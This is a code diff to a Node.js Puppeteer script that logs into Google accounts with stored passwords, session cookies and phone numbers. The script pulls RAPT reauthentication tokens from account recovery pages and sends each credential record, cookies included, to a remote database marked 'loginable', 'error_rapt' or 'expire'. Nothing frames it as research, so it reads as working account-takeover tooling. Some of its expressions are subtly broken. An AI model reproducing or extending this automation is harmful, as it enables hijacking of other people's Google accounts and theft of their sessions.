@@ -17,6 +17,8 @@ let mSameNumber = 0
 let mNumberList = []
 let PROXY = null
 
+let NAME = 'loginable'
+
 
 let mCookie = [
     {
@@ -396,12 +398,12 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                             } catch (error) {}
                             
                             console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-                            await axios.delete(BASE_URL+'loginable/'+number+'.json')
+                            await axios.delete(BASE_URL+NAME+'/'+number+'.json')
                             mSameNumber = 0
                         }
                     } else {
                         try {
-                            await axios.patch(BASE_URL+'error_rapt/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
+                            await axios.patch(BASE_URL+(mLoader.status==100?+'error_login':'error_rapt')+'/'+number+'.json', JSON.stringify({ gmail:mData.gmail.replace(/[.]/g, ''), password:password, cookies:cookies, worker:worker, number:recoveryNumber, create: time }), {
                                 headers: {
                                     'Content-Type': 'application/x-www-form-urlencoded'
                                 }
@@ -409,7 +411,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                         } catch (error) {}
                         
                         console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-                        await axios.delete(BASE_URL+'loginable/'+number+'.json')
+                        await axios.delete(BASE_URL+NAME+'/'+number+'.json')
                         mSameNumber = 0
                     }
                 } else {
@@ -425,7 +427,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                 }
 
                 try {
-                    await axios.delete(BASE_URL+'loginable/'+number+'.json')
+                    await axios.delete(BASE_URL+NAME+'/'+number+'.json')
                 } catch (error) {}
             } catch (error) {
                 console.log('Process: [ Browser Process: Error --- Time: '+getTime()+' ]')
@@ -445,6 +447,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
         } else {
             console.log('Process: [ Coocies Expire: '+number+' --- Time: '+getTime()+' ]')
 
+            await delay(10000000)
             try {
                 await axios.patch(BASE_URL+'expire/'+number+'.json', JSON.stringify({ password:password, cookies:cookies, worker:worker, create: time }), {
                     headers: {
@@ -453,7 +456,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                 })
             } catch (error) {}
 
-            await axios.delete(BASE_URL+'loginable/'+number+'.json')
+            await axios.delete(BASE_URL+NAME+'/'+number+'.json')
         }
     } catch (error) {}
 
@@ -467,7 +470,7 @@ async function loginWithCompleted(number, password, cookies, time, worker) {
                 })
             } catch (error) {}
             console.log('Process: [ Coocies Delete: '+number+' --- Time: '+getTime()+' ]')
-            await axios.delete(BASE_URL+'loginable/'+number+'.json')
+            await axios.delete(BASE_URL+NAME+'/'+number+'.json')
             mSameNumber = 0
         }
     } catch (error) {}
@@ -545,7 +548,6 @@ async function validRaptoken(browser, page, user, password, mRapt) {
 
                     let url = await page.url()
                     let rapt = await getRapt(url)
-                    console.log('Url:', rapt, url)
                     
                     if (!rapt) {
                         await page.goto('https://myaccount.google.com/recovery/email?hl=en', { waitUntil: 'load', timeout: 0 })
@@ -553,29 +555,30 @@ async function validRaptoken(browser, page, user, password, mRapt) {
 
                         let status = await waitForLoginChallenge(page, password, 'https://myaccount.google.com/recovery/email')
 
-                        url = await page.url()
-                        console.log(url)
                         if (status == 1 || status == 3) {
                             rapt = await getRapt(await page.url())
                         }
                     }
 
                     if (rapt) {
-                        return { change: true, browser: browser, page: page, number: number, pass:changePass, rapt: rapt }
+                        return { status:200, change: true, browser: browser, page: page, number: number, pass:changePass, rapt: rapt }
+                    } else {
+                        console.log('Process: [ Status: RAPT Null --- Time: '+getTime()+' ]')
+                        return { status:100, change: true, browser: browser, page: page, number: number, pass:changePass, rapt: null }
                     }
                 } else {
                     console.log('Process: [ New Login: Failed --- Time: '+getTime()+' ]')
                 }
 
-                return { change:true, browser: browser, page: page, number: number, pass:changePass, rapt:null }
+                return { status:0, change:true, browser: browser, page: page, number: number, pass:changePass, rapt:null }
             }
         }
     } catch (error) {}
 
     if (mClose) {
-        return { change:true, browser: browser, page: page, number: null, pass:null, rapt:null }
+        return { status:0, change:true, browser: browser, page: page, number: null, pass:null, rapt:null }
     } else {
-        return { change:false }
+        return { status:0, change:false }
     }
 }
 
@@ -600,10 +603,12 @@ async function waitForGmailLogin(page, user, password, number) {
 
             if (status == 3) {
                 if (await exists(page, 'div[data-challengetype="13"]')) {
+                    console.log('Process: [ Login: Number Challenge Type --- Time: '+getTime()+' ]')
                     await delay(500)
                     await page.click('div[data-challengetype="13"]')
 
-                    if (await waitforLoginNumber(page)) {
+                    let type = await waitforLoginNumber(page)
+                    if (type == 1) {
                         await delay(500)
                         await page.type('input#phoneNumberId', '+'+number)
                         await delay(500)
@@ -619,7 +624,11 @@ async function waitForGmailLogin(page, user, password, number) {
                         status = await waitForLoginSuccess(page)
                         
                         return status
+                    } else if (type == 2) {
+                        
                     }
+                } else {
+                    console.log('Process: [ Login: Number Challenge Others --- Time: '+getTime()+' ]')
                 }
             }
 
@@ -2251,7 +2260,7 @@ async function exists(page, element) {
 async function getGmailData() {
 
     try {
-        let response = await axios.get(BASE_URL+'loginable.json?orderBy=%22$key%22&limitToFirst=1')
+        let response = await axios.get(BASE_URL+NAME+'.json?orderBy=%22$key%22&limitToFirst=1')
         let data = response.data
         if (data) {
             let number = Object.keys(data)[0]
